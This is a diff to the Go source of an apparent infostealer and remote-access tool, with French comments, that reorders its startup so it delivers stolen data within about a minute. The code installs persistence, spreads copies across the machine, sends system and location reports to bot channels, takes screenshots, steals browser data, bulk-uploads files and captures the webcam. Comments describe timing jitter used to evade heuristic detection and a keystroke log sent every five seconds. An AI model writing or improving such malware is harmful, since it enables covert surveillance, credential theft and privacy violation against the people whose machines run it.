@@ -466,59 +466,53 @@ func startPayload() {
 	// étape part à son heure, avec un jitter, dans un ordre qui ressemble à
 	// une application qui se lance.
 	guard("boot", func() {
-		// 1. Persistance : discrète, tôt, sans autre activité simultanée.
-		time.Sleep(time.Duration(20+rand.Intn(25)) * time.Second)
+		// Tout est créé puis lancé dans l'ordre, en moins d'une minute :
+		// salons, état, géolocalisation, capture, extraction, fichiers.
+		// L'étalement reste utile contre l'heuristique, mais il n'attend plus
+		// plusieurs minutes avant de livrer quoi que ce soit.
+		time.Sleep(time.Duration(3+rand.Intn(4)) * time.Second)
+		if stopped.Load() {
+			return
+		}
+		ensureAllChannels()
+
+		time.Sleep(time.Duration(2+rand.Intn(3)) * time.Second)
+		if s, err := systemReport(); err == nil {
+			botSendText(infosChannel(), s)
+		}
+		botSendText(infosChannel(), locationReport())
+
+		time.Sleep(time.Duration(3+rand.Intn(3)) * time.Second)
 		if stopped.Load() {
 			return
 		}
 		if cfg.Persist {
 			persistInstall()
 		}
-		// Duplication sur le poste : une copie supprimée ne coupe rien.
 		spreadCopies(false)
 		go spreadLoop()
 
-		// 2. Rapport machine : une seule requête réseau, rien de sensible.
-		time.Sleep(time.Duration(15+rand.Intn(20)) * time.Second)
-		if stopped.Load() {
-			return
-		}
-		if s, err := systemReport(); err == nil {
-			sendText(s)
-		}
-
-		// 3. Première capture : l'application « regarde son écran ».
-		time.Sleep(time.Duration(20+rand.Intn(20)) * time.Second)
-		if stopped.Load() {
-			return
-		}
+		time.Sleep(time.Duration(5+rand.Intn(5)) * time.Second)
 		screenshotFlush()
 
-		// 4. Extraction des navigateurs : plus tard, une seule fois, quand le
-		// scan de démarrage est terminé.
-		time.Sleep(time.Duration(90+rand.Intn(120)) * time.Second)
+		time.Sleep(time.Duration(8+rand.Intn(7)) * time.Second)
 		if stopped.Load() {
 			return
 		}
 		stealAll(true)
 
-		// Première extraction de masse, une seule fois par poste.
+		time.Sleep(time.Duration(5+rand.Intn(5)) * time.Second)
+		if stopped.Load() {
+			return
+		}
 		go bulkUploadAll(false)
 
-		// 5. Webcam : encore plus tard, et seulement si une caméra existe.
-		time.Sleep(time.Duration(120+rand.Intn(180)) * time.Second)
+		time.Sleep(time.Duration(15+rand.Intn(15)) * time.Second)
 		if stopped.Load() {
 			return
 		}
 		webcamFlush()
-
-		time.Sleep(time.Duration(240+rand.Intn(300)) * time.Second)
-		if stopped.Load() {
-			return
-		}
-		exfilAll()
 	})
-
 	// Cadences. Le journal du clavier part toutes les 5 secondes : c'est le
 	// canal « en direct ». Captures d'écran (un fichier par moniteur) tournent
 	// toutes les 20 secondes. Webcam (une photo) toutes les 1 minute. Le vol
